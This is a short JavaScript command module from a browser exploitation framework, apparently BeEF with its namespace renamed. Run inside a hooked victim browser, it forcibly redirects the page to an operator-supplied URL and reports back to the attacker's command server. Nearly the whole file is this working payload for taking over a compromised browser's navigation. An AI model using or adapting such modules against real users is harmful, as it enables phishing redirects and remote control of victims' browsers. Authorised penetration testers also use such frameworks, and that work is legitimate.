//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	window.location = "<%= @redirect_url %>";
	server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Redirected to: <%= @redirect_url %>');

});

